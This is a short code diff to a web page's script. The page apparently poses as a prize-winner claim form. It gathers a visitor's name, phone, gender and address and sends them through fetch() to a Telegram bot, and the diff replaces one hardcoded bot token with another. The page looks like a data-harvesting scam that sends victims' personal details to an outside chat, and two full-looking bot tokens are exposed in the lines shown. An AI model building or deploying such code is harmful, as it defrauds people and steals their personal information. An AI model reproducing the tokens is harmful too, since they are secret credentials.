@@ -285,7 +285,7 @@
       if (!name || !phone || !gender || !address) return alert("Fill all fields!");
 
       const msg = `Winner:\nNick: ${nickname}\nName: ${name}\nPhone: ${phone}\nGender: ${gender}\nAddress: ${address}`;
-      const botToken = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
+      const botToken = "8526007970:AAEg0JqfDrdmdcn_5FysowgKuwER3Ifvx-I";
       const chatId = "874563737";
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
         .then(() => {
